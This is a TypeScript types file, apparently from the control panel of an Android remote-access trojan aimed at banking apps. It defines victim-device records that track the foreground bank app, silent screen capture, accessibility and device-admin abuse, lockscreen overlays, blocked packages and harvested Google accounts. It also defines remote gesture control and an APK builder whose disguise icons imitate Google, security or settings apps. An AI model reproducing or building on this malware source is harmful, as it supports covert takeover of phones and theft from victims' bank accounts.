// Tipos para o sistema RESTRITO REMOTE

export interface Device {
  id: string;
  device_id: string;
  model: string;
  manufacturer: string;
  android_version: string;
  first_seen?: string | null;
  last_seen: string;
  is_online: boolean;
  has_screen: boolean;
  ip_address?: string | null;
  silent_active?: boolean;
  capture_method?: string | null;
  last_activity_at?: string | null;
  active_bank?: { package: string; appName: string; icon?: string; timestamp?: string } | null;
  foreground_package?: string | null;
  foreground_app?: string | null;
  is_locked?: boolean | null;
  is_screen_on?: boolean | null;
  battery_level?: number | null;
  is_charging?: boolean | null;
  accessibility_active?: boolean | null;
  country?: string | null;
  admin_active?: boolean;
  custom_name?: string | null;
  lockscreen_active?: boolean;
  network_type?: string | null;
  sim_operator?: string | null;
  carrier?: string | null;
  accounts?: string[];
  google_accounts?: string[];
  blocked_packages?: string[];
}

export interface User {
  username: string;
  email: string;
  token: string;
}

export interface LoginCredentials {
  username: string;
  password: string;
  hwid?: string;
}

export interface RegisterCredentials extends LoginCredentials {
  email: string;
}

export interface CommandRequest {
  action: string;
  [key: string]: any;
}

export interface GestureEvent {
  type: 'click' | 'long_press' | 'swipe' | 'drag' | 'scroll';
  x?: number;
  y?: number;
  x1?: number;
  y1?: number;
  x2?: number;
  y2?: number;
  duration?: number;
}

export interface APKConfig {
  app_name: string;
  server_url: string;
  icon_preset?: 'default' | 'google' | 'security' | 'settings';
}

export interface DeviceLog {
  id: number;
  type: string;
  data: string;
  created_at: string;
}

export interface ScreenDimensions {
  width: number;
  height: number;
  scale: number;
}

